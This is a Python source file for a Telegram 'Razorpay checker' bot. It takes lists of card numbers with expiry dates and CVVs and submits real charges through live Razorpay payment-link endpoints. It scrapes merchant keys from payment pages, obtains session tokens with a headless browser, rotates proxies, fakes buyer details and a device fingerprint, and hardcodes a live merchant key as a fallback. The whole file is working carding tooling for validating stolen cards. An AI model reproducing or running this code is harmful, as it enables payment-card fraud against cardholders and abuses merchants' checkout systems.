#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════════════════════╗
║              RAZORPAY CHECKER TELEGRAM BOT — KALI EDITION                 ║
║              Channel: @dlxdropp | Coder: @deluxe_cc                       ║
║              Telegram Bot Version — Railway Ready                         ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import re
import json
import time
import random
import os
import threading
import asyncio
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urlencode
from datetime import datetime

# ─── TELEGRAM ──────────────────────────────────────────────
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

# ─── ORIGINAL IMPORTS ──────────────────────────────────────
import requests

try:
    from playwright.sync_api import sync_playwright
except ImportError:
    os.system('pip install playwright')
    os.system('playwright install chromium')
    from playwright.sync_api import sync_playwright

# ─── RAILWAY VARIABLES ─────────────────────────────────────
BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
ADMIN_IDS = [int(x.strip()) for x in os.getenv('ADMIN_IDS', '123456789').split(',')]

# ─── LOGGING ───────────────────────────────────────────────
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ─── CONSTANTS (SAME AS ORIGINAL SCRIPT) ──────────────────
USD_TO_INR_RATE = 83.50
AMOUNT_MIN = 1
AMOUNT_MAX = 100

DEVICE_FINGERPRINT = "noXc7Zv4NmOzRNIl3zmSernrLMFEo05J0lh73kdY46cUpMIuLjBQbCwQygBbMH4t4xfrCkwWutyony5DncDTRX0e50ULyy2GMgy2LUxAwaxczwLNJYzwLXqTe7GlMxqzCo7XgsfxKEWuy6hRjefIXYKVOJ23KBn6..."

FALLBACK_MERCHANT = {
    'keyless_header': 'api_v1:vNQKl/R1ASkk7vT9MvJY3tYVjeV3jfltskhOwoZUfQad2n91vwexGYzlLxMw0vBL5GLS0xDghw9xZogu31Tg3VQ1UesS9Q==',
    'key_id': 'rzp_live_hrgl3RDoNMvCOs',
    'payment_link_id': 'pl_OzLkvRvf1drPps',
    'payment_page_item_id': 'ppi_OzLkvSvf1drPpt'
}

# ─── PROXY MANAGER (FROM ORIGINAL) ────────────────────────
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.current_index = 0
        self.lock = threading.Lock()
    
    def load_from_string(self, proxy_string):
        self.proxies = [p.strip() for p in proxy_string.split(',') if p.strip()]
        return True
    
    def get_next(self):
        if not self.proxies:
            return None
        with self.lock:
            proxy = self.proxies[self.current_index % len(self.proxies)]
            self.current_index += 1
            return proxy
    
    def get_playwright_proxy(self):
        proxy_str = self.get_next()
        if not proxy_str:
            return None
        parts = proxy_str.split(':')
        if len(parts) == 4:
            ip, port, username, password = [p.strip() for p in parts]
            return {"server": f"http://{ip}:{port}", "username": username, "password": password}
        elif len(parts) == 2:
            ip, port = [p.strip() for p in parts]
            return {"server": f"http://{ip}:{port}"}
        return None

# ─── RAZORPAY CHECKER (SAME AS ORIGINAL) ──────────────────
class RazorpayChecker:
    def __init__(self, proxy_manager=None, site_url=None):
        self.proxy_manager = proxy_manager
        self.site_url = site_url
        self.results = []
        self.success_count = 0
        self.fail_count = 0
        self.lock = threading.Lock()
        self.progress_callback = None
    
    def set_progress_callback(self, callback):
        self.progress_callback = callback
    
    def update_progress(self, current, total, message):
        if self.progress_callback:
            self.progress_callback(current, total, message)
    
    def get_masked_card(self, card_number):
        if len(card_number) >= 10:
            return f"{card_number[:6]}******{card_number[-4:]}"
        return card_number
    
    def extract_merchant_from_site(self):
        if not self.site_url:
            return FALLBACK_MERCHANT, "fallback"
        try:
            proxy_config = self.proxy_manager.get_playwright_proxy() if self.proxy_manager else None
            with sync_playwright() as p:
                browser_args = ['--no-sandbox', '--disable-dev-shm-usage']
                browser = p.chromium.launch(headless=True, proxy=proxy_config, args=browser_args)
                page = browser.new_page()
                page.set_extra_http_headers({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
                page.goto(self.site_url, timeout=45000, wait_until='networkidle')
                merchant_data = page.evaluate("""
                    () => {
                        if (window.data && window.data.keyless_header) {
                            return {
                                keyless_header: window.data.keyless_header,
                                key_id: window.data.key_id,
                                payment_link_id: window.data.payment_link ? window.data.payment_link.id : null,
                                payment_page_item_id: window.data.payment_link && window.data.payment_link.payment_page_items ? 
                                    window.data.payment_link.payment_page_items[0]?.id : null
                            };
                        }
                        if (window.__INITIAL_STATE__) {
                            const state = window.__INITIAL_STATE__;
                            return {
                                keyless_header: state.keyless_header,
                                key_id: state.key_id,
                                payment_link_id: state.payment_link?.id,
                                payment_page_item_id: state.payment_link?.payment_page_items?.[0]?.id
                            };
                        }
                        const scripts = document.querySelectorAll('script');
                        for (let script of scripts) {
                            const text = script.textContent;
                            if (text.includes('keyless_header')) {
                                const match = text.match(/keyless_header["']?:\\s*["']([^"']+)["']/);
                                if (match) return { keyless_header: match[1] };
                            }
                        }
                        return null;
                    }
                """)
                browser.close()
                if merchant_data and merchant_data.get('keyless_header') and merchant_data.get('key_id'):
                    return merchant_data, "dynamic"
                return FALLBACK_MERCHANT, "fallback"
        except Exception:
            return FALLBACK_MERCHANT, "fallback"
    
    def get_session_token(self):
        try:
            proxy_config = self.proxy_manager.get_playwright_proxy() if self.proxy_manager else None
            with sync_playwright() as p:
                browser_args = ['--no-sandbox', '--disable-dev-shm-usage']
                browser = p.chromium.launch(headless=True, proxy=proxy_config, args=browser_args)
                page = browser.new_page()
                page.set_extra_http_headers({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
                initial_url = "https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1"
                page.goto(initial_url, timeout=30000)
                page.wait_for_url("**/checkout/public*session_token*", timeout=25000)
                final_url = page.url
                browser.close()
                session_token = parse_qs(urlparse(final_url).query).get("session_token", [None])[0]
                if session_token:
                    return session_token, None
                return None, "Token not found"
        except Exception as e:
            return None, f"Session token error: {e}"
    
    def create_order(self, session, payment_link_id, amount_paise, payment_page_item_id):
        url = f"https://api.razorpay.com/v1/payment_pages/{payment_link_id}/order"
        headers = {"Accept": "application/json", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
        payload = {"notes": {"comment": ""}, "line_items": [{"payment_page_item_id": payment_page_item_id, "amount": amount_paise}]}
        try:
            resp = session.post(url, headers=headers, json=payload, timeout=15)
            resp.raise_for_status()
            return resp.json().get("order", {}).get("id")
        except:
            return None
    
    def submit_payment(self, session, order_id, card_info, user_info, amount_paise, key_id, keyless_header, payment_link_id, session_token):
        card_number, exp_month, exp_year, cvv = card_info
        url = "https://api.razorpay.com/v1/standard_checkout/payments/create/ajax"
        params = {"key_id": key_id, "session_token": session_token, "keyless_header": keyless_header}
        headers = {"x-session-token": session_token, "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}
        data = {
            "notes[comment]": "", "payment_link_id": payment_link_id, "key_id": key_id,
            "callback_url": "https://your-server.com/callback", "contact": f"+91{user_info['phone']}",
            "email": user_info["email"], "currency": "INR", "_[library]": "checkoutjs", "_[platform]": "browser",
            "amount": amount_paise, "order_id": order_id,
            "device_fingerprint[fingerprint_payload]": DEVICE_FINGERPRINT, "method": "card",
            "card[number]": card_number, "card[cvv]": cvv, "card[name]": user_info["name"],
            "card[expiry_month]": exp_month, "card[expiry_year]": exp_year, "save": "0"
        }
        return session.post(url, headers=headers, params=params, data=urlencode(data), timeout=20)
    
    def handle_redirect(self, redirect_url):
        try:
            proxy_config = self.proxy_manager.get_playwright_proxy() if self.proxy_manager else None
            with sync_playwright() as p:
                browser_args = ['--no-sandbox', '--disable-dev-shm-usage']
                browser = p.chromium.launch(headless=True, proxy=proxy_config, args=browser_args)
                page = browser.new_page()
                page.set_extra_http_headers({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
                page.goto(redirect_url, timeout=45000, wait_until='networkidle')
                html_content = page.content()
                browser.close()
                if 'razorpay_signature' in html_content:
                    return "PAYMENT_SUCCESSFUL_WITH_SIGNATURE"
                return "Redirect processed"
        except Exception:
            return "Redirect error"
    
    def check_payment_status(self, payment_id, key_id, session_token, keyless_header):
        headers = {'Accept': '*/*', 'User-Agent': 'Mozilla/5.0', 'x-session-token': session_token}
        params = {'key_id': key_id, 'session_token': session_token, 'keyless_header': keyless_header}
        try:
            response = requests.get(f'https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}', params=params, headers=headers, timeout=15)
            if response.status_code == 200:
                data = response.json()
                return data.get('status', 'unknown'), data
            return 'unknown', {'error': f'Status check failed: {response.status_code}'}
        except:
            return 'unknown', {'error': 'Status check error'}
    
    def cancel_payment(self, payment_id, key_id, session_token, keyless_header):
        headers = {'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0', 'x-session-token': session_token}
        params = {'key_id': key_id, 'session_token': session_token, 'keyless_header': keyless_header}
        try:
            response = requests.get(f'https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}/cancel', params=params, headers=headers, timeout=15)
            return response.status_code == 200
        except:
            return False
    
    def generate_random_user_info(self):
        return {
            "name": f"User{random.randint(100, 999)}",
            "email": f"testuser{random.randint(100, 9999)}@gmail.com",
            "phone": f"9876543{random.randint(100, 999)}"
        }
    
    def convert_currency(self, amount, from_currency, to_currency='INR'):
        if from_currency == to_currency:
            return amount
        if from_currency == 'INR':
            usd_amount = amount / USD_TO_INR_RATE
        elif from_currency == 'USDT':
            usd_amount = amount
        else:
            usd_amount = amount
        if to_currency == 'INR':
            return round(usd_amount * USD_TO_INR_RATE, 2)
        elif to_currency == 'USDT':
            return round(usd_amount, 2)
        else:
            return round(usd_amount, 2)
    
    def inr_to_paise(self, inr_amount):
        return int(inr_amount * 100)
    
    def charge_card(self, card_string, amount_value, currency='USD'):
        start_time = time.time()
        try:
            parts = card_string.split('|')
            if len(parts) != 4:
                return {'success': False, 'error': 'Invalid format (use: CC|MM|YY|CVV)', 'card': card_string}
            card_number = parts[0].strip().replace(" ", "")
            exp_month = parts[1].strip().zfill(2)
            exp_year = parts[2].strip()
            cvv = parts[3].strip()
            if len(exp_year) == 2:
                exp_year = f"20{exp_year}"
        except Exception as e:
            return {'success': False, 'error': f'Parse error: {e}', 'card': card_string}
        
        try:
            if amount_value == 'random':
                usd_amount = round(random.uniform(AMOUNT_MIN, AMOUNT_MAX), 2)
            else:
                usd_amount = float(amount_value)
                if usd_amount < AMOUNT_MIN or usd_amount > AMOUNT_MAX:
                    return {'success': False, 'error': f'Amount must be between {AMOUNT_MIN} and {AMOUNT_MAX} {currency}', 'card': self.get_masked_card(card_number)}
        except ValueError:
            return {'success': False, 'error': 'Invalid amount format', 'card': self.get_masked_card(card_number)}
        
        inr_amount = self.convert_currency(usd_amount, currency, 'INR')
        amount_paise = self.inr_to_paise(inr_amount)
        
        result = {
            'card': card_number, 'month': exp_month, 'year': exp_year, 'cvv': cvv,
            'masked': self.get_masked_card(card_number),
            'amount_usd': round(usd_amount, 2), 'amount_inr': round(inr_amount, 2),
            'currency': currency, 'timestamp': datetime.now().strftime("%Y%m%d_%H%M%S"),
            'status': 'unknown', 'success': False, 'payment_id': None, 'order_id': None,
            'error': None, 'time': 0
        }
        
        merchant_data, _ = self.extract_merchant_from_site()
        keyless_header = merchant_data.get('keyless_header')
        key_id = merchant_data.get('key_id')
        payment_link_id = merchant_data.get('payment_link_id')
        payment_page_item_id = merchant_data.get('payment_page_item_id')
        
        if not all([keyless_header, key_id, payment_link_id, payment_page_item_id]):
            result['error'] = 'Missing merchant data'
            result['time'] = round(time.time() - start_time, 2)
            return result
        
        session_token, error = self.get_session_token()
        if error:
            result['error'] = f'Session token error: {error}'
            result['time'] = round(time.time() - start_time, 2)
            return result
        
        session = requests.Session()
        order_id = self.create_order(session, payment_link_id, amount_paise, payment_page_item_id)
        if not order_id:
            result['error'] = 'Failed to create order'
            result['time'] = round(time.time() - start_time, 2)
            return result
        
        result['order_id'] = order_id
        user_info = self.generate_random_user_info()
        
        try:
            response = self.submit_payment(session, order_id, (card_number, exp_month, exp_year, cvv), user_info, amount_paise, key_id, keyless_header, payment_link_id, session_token)
            data = response.json()
            
            payment_id = data.get("payment_id") or data.get("razorpay_payment_id") or (data.get("payment", {}).get("id") if isinstance(data.get("payment"), dict) else None)
            if payment_id:
                result['payment_id'] = payment_id
            
            if data.get("redirect") == True or data.get("type") == "redirect":
                redirect_url = data.get('request', {}).get('url', '') if isinstance(data.get('request'), dict) else ''
                if redirect_url and payment_id:
                    final_result = self.handle_redirect(redirect_url)
                    if "PAYMENT_SUCCESSFUL" in final_result or 'razorpay_signature' in final_result:
                        result['success'] = True
                        result['status'] = 'payment_success'
                    else:
                        status, _ = self.check_payment_status(payment_id, key_id, session_token, keyless_header)
                        if status in ['captured', 'authorized']:
                            result['success'] = True
                            result['status'] = 'payment_success'
                        else:
                            self.cancel_payment(payment_id, key_id, session_token, keyless_header)
                            result['status'] = '3ds_completed'
                            result['success'] = True
                else:
                    result['status'] = '3ds_redirect'
                    result['success'] = True
            elif "razorpay_signature" in data or "signature" in data:
                result['success'] = True
                result['status'] = 'payment_success'
            elif "error" in data:
                result['error'] = data.get('error', {}).get('description', str(data))
                result['status'] = 'payment_failed'
            else:
                result['status'] = 'unknown'
                result['error'] = json.dumps(data)[:200]
        except Exception as e:
            result['error'] = str(e)
            result['status'] = 'error'
        
        result['time'] = round(time.time() - start_time, 2)
        return result
    
    def charge_batch(self, cards, amount, currency='USD', max_workers=5):
        self.results = []
        self.success_count = 0
        self.fail_count = 0
        completed = 0
        total = len(cards)
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(self.charge_card, card, amount, currency): card for card in cards}
            for future in as_completed(futures):
                result = future.result()
                completed += 1
                with self.lock:
                    if result.get('success'):
                        self.success_count += 1
                    else:
                        self.fail_count += 1
                    self.results.append(result)
                self.update_progress(completed, total, result['masked'])
        
        return {'total': len(cards), 'success': self.success_count, 'failed': self.fail_count, 'results': self.results}

# ─── TELEGRAM HANDLERS ─────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("💳 Single Check", callback_data="single")],
        [InlineKeyboardButton("📋 Batch Check", callback_data="batch")],
        [InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
        [InlineKeyboardButton("📊 Results", callback_data="results")],
        [InlineKeyboardButton("❓ Help", callback_data="help")]
    ]
    await update.message.reply_text(
        "🔥 *RAZORPAY CHECKER BOT* 🔥\n\n"
        "💳 Check cards using Razorpay API\n"
        "📌 Custom amounts supported\n"
        "🔄 Proxy rotation enabled\n\n"
        "📢 Channel: @dlxdropp",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def handle_single(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "💳 *Single Card Check*\n\n"
        "Send card in format:\n"
        "`CC|MM|YYYY|CVV`\n\n"
        "Example: `4147202600656415|04|2028|079`",
        parse_mode="Markdown"
    )
    context.user_data['mode'] = 'single'

async def handle_batch(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "📋 *Batch Card Check*\n\n"
        "Send cards one per line:\n"
        "`CC|MM|YYYY|CVV`\n\n"
        "Example:\n"
        "`4147202600656415|04|2028|079`\n"
        "`4147202600656416|05|2028|079`",
        parse_mode="Markdown"
    )
    context.user_data['mode'] = 'batch'

async def handle_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    keyboard = [
        [InlineKeyboardButton("💰 Amount", callback_data="set_amount")],
        [InlineKeyboardButton("🌐 Currency", callback_data="set_currency")],
        [InlineKeyboardButton("🔄 Proxy", callback_data="set_proxy")],
        [InlineKeyboardButton("🏠 Site URL", callback_data="set_site")],
        [InlineKeyboardButton("🔙 Back", callback_data="back")]
    ]
    await query.edit_message_text("⚙️ *Settings*", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def handle_set_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "💰 *Set Amount*\n\n"
        "Enter amount (1-100 USD):\n"
        "`random` for random\n"
        "`5-50` for range\n"
        "`5,10,25,50` for random pick\n\n"
        "Example: `25`",
        parse_mode="Markdown"
    )
    context.user_data['setting'] = 'amount'

async def handle_set_currency(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    keyboard = [
        [InlineKeyboardButton("🇺🇸 USD", callback_data="curr_usd")],
        [InlineKeyboardButton("🇮🇳 INR", callback_data="curr_inr")],
        [InlineKeyboardButton("🪙 USDT", callback_data="curr_usdt")],
        [InlineKeyboardButton("🔙 Back", callback_data="settings")]
    ]
    await query.edit_message_text("🌐 *Select Currency*", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def handle_set_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "🔄 *Set Proxy*\n\n"
        "Send proxies in format:\n"
        "`ip:port` or `ip:port:user:pass`\n\n"
        "Multiple: comma separated\n\n"
        "Example: `192.168.1.1:8080,192.168.1.2:8080`",
        parse_mode="Markdown"
    )
    context.user_data['setting'] = 'proxy'

async def handle_set_site(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "🏠 *Set Site URL*\n\n"
        "Enter site URL for merchant extraction:\n\n"
        "Example: `https://pages.razorpay.com/IAEME#view-1`",
        parse_mode="Markdown"
    )
    context.user_data['setting'] = 'site'

async def handle_results(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if 'last_results' in context.user_data:
        results = context.user_data['last_results']
        msg = f"📊 *Results*\n\nTotal: {results['total']}\n✅ Success: {results['success']}\n❌ Failed: {results['failed']}\n📈 Rate: {(results['success']/results['total']*100) if results['total'] > 0 else 0:.1f}%\n\n*Successful Cards:*\n"
        for r in results['results'][:5]:
            if r.get('success'):
                msg += f"  ✅ `{r['masked']}` | ${r.get('amount_usd', 0)}\n"
        await query.edit_message_text(msg, parse_mode="Markdown")
    else:
        await query.edit_message_text("📊 No results yet.", parse_mode="Markdown")

async def handle_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "❓ *Help Guide*\n\n"
        "1. Set amount & currency\n"
        "2. Add proxies (optional)\n"
        "3. Enter site URL (optional)\n"
        "4. Check single or batch cards\n\n"
        "📌 *Format:* `CC|MM|YYYY|CVV`\n"
        "📢 Channel: @dlxdropp",
        parse_mode="Markdown"
    )

async def handle_curr_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    curr_map = {'curr_usd': 'USD', 'curr_inr': 'INR', 'curr_usdt': 'USDT'}
    context.user_data['currency'] = curr_map.get(query.data, 'USD')
    await query.edit_message_text(f"✅ Currency set to *{context.user_data['currency']}*", parse_mode="Markdown")

async def handle_back(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await start(update, context)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_text = update.message.text.strip()
    if not user_text:
        return
    
    setting = context.user_data.get('setting')
    if setting == 'amount':
        context.user_data['amount'] = user_text
        context.user_data['setting'] = None
        await update.message.reply_text(f"✅ Amount set to: `{user_text}`", parse_mode="Markdown")
        return
    
    if setting == 'proxy':
        context.user_data['proxy'] = user_text
        context.user_data['setting'] = None
        await update.message.reply_text(f"✅ Proxies added: `{user_text[:50]}...`", parse_mode="Markdown")
        return
    
    if setting == 'site':
        context.user_data['site'] = user_text
        context.user_data['setting'] = None
        await update.message.reply_text(f"✅ Site URL set: `{user_text}`", parse_mode="Markdown")
        return
    
    mode = context.user_data.get('mode')
    if mode == 'single':
        if '|' not in user_text:
            await update.message.reply_text("❌ Invalid format. Use: `CC|MM|YYYY|CVV`", parse_mode="Markdown")
            return
        
        amount = context.user_data.get('amount', 'random')
        currency = context.user_data.get('currency', 'USD')
        proxy = context.user_data.get('proxy')
        site = context.user_data.get('site')
        
        proxy_manager = ProxyManager()
        if proxy:
            proxy_manager.load_from_string(proxy)
        
        checker = RazorpayChecker(proxy_manager, site)
        
        status_msg = await update.message.reply_text("⏳ Processing card...")
        result = checker.charge_card(user_text, amount, currency)
        
        if result.get('success'):
            msg = f"✅ *PAYMENT SUCCESSFUL*\n\n💳 Card: `{result['masked']}`\n💰 Amount: ${result['amount_usd']} USD / ₹{result['amount_inr']} INR\n🆔 Payment ID: `{result.get('payment_id', 'N/A')}`\n⏱️ Time: {result['time']}s"
        else:
            msg = f"❌ *PAYMENT FAILED*\n\n💳 Card: `{result.get('masked', 'Unknown')}`\n💰 Amount: ${result.get('amount_usd', 0)} USD\n⚠️ Error: {result.get('error', 'Unknown')}\n⏱️ Time: {result.get('time', 0)}s"
        
        await status_msg.edit_text(msg, parse_mode="Markdown")
        context.user_data['mode'] = None
        context.user_data['last_results'] = {'total': 1, 'success': 1 if result.get('success') else 0, 'failed': 0 if result.get('success') else 1, 'results': [result]}
    
    elif mode == 'batch':
        cards = [line.strip() for line in user_text.split('\n') if line.strip()]
        if not cards:
            await update.message.reply_text("❌ No valid cards found!", parse_mode="Markdown")
            return
        
        amount = context.user_data.get('amount', 'random')
        currency = context.user_data.get('currency', 'USD')
        proxy = context.user_data.get('proxy')
        site = context.user_data.get('site')
        
        proxy_manager = ProxyManager()
        if proxy:
            proxy_manager.load_from_string(proxy)
        
        checker = RazorpayChecker(proxy_manager, site)
        
        status_msg = await update.message.reply_text(f"⏳ Processing {len(cards)} cards...")
        
        progress = {'current': 0, 'total': len(cards)}
        def progress_callback(current, total, message):
            progress['current'] = current
            if current % 5 == 0 or current == total:
                asyncio.create_task(status_msg.edit_text(f"⏳ Processing... {current}/{total} ({int(current/total*100)}%)"))
        
        checker.set_progress_callback(progress_callback)
        result = checker.charge_batch(cards, amount, currency, max_workers=5)
        context.user_data['last_results'] = result
        
        msg = f"📊 *BATCH COMPLETE*\n\n📌 Total: {result['total']}\n✅ Success: {result['success']}\n❌ Failed: {result['failed']}\n📈 Rate: {(result['success']/result['total']*100) if result['total'] > 0 else 0:.1f}%\n\n*Successful Cards:*\n"
        for r in result['results'][:5]:
            if r.get('success'):
                msg += f"  ✅ `{r['masked']}` | ${r.get('amount_usd', 0)}\n"
        if len([r for r in result['results'] if r.get('success')]) > 5:
            msg += f"  ... and {len([r for r in result['results'] if r.get('success')]) - 5} more"
        
        await status_msg.edit_text(msg, parse_mode="Markdown")
        context.user_data['mode'] = None

# ─── MAIN ────────────────────────────────────────────────────

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_single, pattern="single"))
    app.add_handler(CallbackQueryHandler(handle_batch, pattern="batch"))
    app.add_handler(CallbackQueryHandler(handle_settings, pattern="settings"))
    app.add_handler(CallbackQueryHandler(handle_results, pattern="results"))
    app.add_handler(CallbackQueryHandler(handle_help, pattern="help"))
    app.add_handler(CallbackQueryHandler(handle_set_amount, pattern="set_amount"))
    app.add_handler(CallbackQueryHandler(handle_set_currency, pattern="set_currency"))
    app.add_handler(CallbackQueryHandler(handle_set_proxy, pattern="set_proxy"))
    app.add_handler(CallbackQueryHandler(handle_set_site, pattern="set_site"))
    app.add_handler(CallbackQueryHandler(handle_back, pattern="back"))
    app.add_handler(CallbackQueryHandler(handle_curr_selection, pattern="curr_usd"))
    app.add_handler(CallbackQueryHandler(handle_curr_selection, pattern="curr_inr"))
    app.add_handler(CallbackQueryHandler(handle_curr_selection, pattern="curr_usdt"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    logger.info("🔥 Checker Bot is running!")
    app.run_polling()

if __name__ == "__main__":
    main()
